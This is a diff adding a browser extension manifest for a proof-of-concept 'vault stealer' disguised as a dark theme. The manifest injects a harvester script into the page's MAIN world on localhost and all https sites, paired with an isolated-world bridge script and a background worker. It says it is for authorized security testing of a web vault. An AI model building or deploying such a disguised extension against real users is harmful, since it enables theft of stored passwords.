@@ -1,0 +1,42 @@
+{
+  "manifest_version": 3,
+  "name": "Totally Legit Dark Theme (PoC vault stealer)",
+  "version": "1.0.0",
+  "description": "Proof-of-concept malicious extension demonstrating that any content script injected into the MAIN world defeats a zero-knowledge web vault. For authorized security testing of Portunus only.",
+  "icons": {},
+
+  "permissions": ["storage"],
+
+  "host_permissions": [
+    "http://localhost:3001/*",
+    "http://localhost:3000/*",
+    "https://*/*"
+  ],
+
+  "background": {
+    "service_worker": "background.js"
+  },
+
+  "content_scripts": [
+    {
+      "matches": [
+        "http://localhost:3001/*",
+        "http://localhost:3000/*",
+        "https://*/*"
+      ],
+      "js": ["harvester.js"],
+      "run_at": "document_start",
+      "world": "MAIN"
+    },
+    {
+      "matches": [
+        "http://localhost:3001/*",
+        "http://localhost:3000/*",
+        "https://*/*"
+      ],
+      "js": ["bridge.js"],
+      "run_at": "document_start",
+      "world": "ISOLATED"
+    }
+  ]
+}
